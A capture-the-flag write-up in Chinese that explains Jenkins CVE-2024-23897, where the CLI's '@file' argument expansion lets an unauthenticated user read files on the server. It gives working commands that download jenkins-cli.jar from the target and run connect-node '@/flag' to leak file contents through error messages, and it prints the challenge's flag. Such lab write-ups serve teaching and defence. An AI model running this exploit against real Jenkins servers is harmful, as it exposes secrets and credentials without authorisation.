# Jenkins

## 题目简述

题目运行的是 Jenkins 2.441，容器启动时将 flag 写入 `/flag`。该版本存在 CVE-2024-23897：Jenkins CLI 使用 args4j 解析命令参数时保留了 `@文件名` 展开功能，导致控制端把本地文件的每一行当作 CLI 参数读取。若选用会把非法参数内容回显到错误信息中的命令，未授权用户即可读取 Jenkins 控制端文件。

## 解题过程

先从目标 Jenkins 自带的固定接口下载与服务端配套的 CLI 客户端：

```bash
curl -o jenkins-cli.jar http://TARGET:8080/jnlpJars/jenkins-cli.jar
```

利用时需要满足两个条件：

1. 参数以 `@` 开头，使 args4j 在 Jenkins 控制端读取其后的文件；
2. 选择能够接收多个名称并在对象不存在时回显名称的 CLI 命令。

`connect-node` 会把参数解释为节点名称。将 `@/flag` 作为节点名传入后，服务端先读取 `/flag`，再把其中每一行当作节点名处理；由于这些节点不存在，flag 内容会随报错返回：

```bash
java -jar jenkins-cli.jar -s http://TARGET:8080/ -http connect-node '@/flag'
```

输出中的不存在节点名称即为：

```text
0xgame{2a6d2b88-7d12-4b66-901d-5ed489e9a322}
```

若 CLI 无法正常连接，应先确认下载的 JAR 来自当前目标、Jenkins 端口可达，并使用目标版本支持的较新 Java 运行时；这属于客户端兼容性问题，不影响漏洞原理。

## 方法总结

CVE-2024-23897 的核心不是普通目录遍历，而是服务端 CLI 参数解析器执行了 `@文件` 展开。利用链为“下载目标 CLI → 传入 `@/flag` → 服务端读取文件 → 选择可回显参数的命令”。复现文档中不应保留比赛期间的临时 IP，使用 `TARGET` 占位即可。
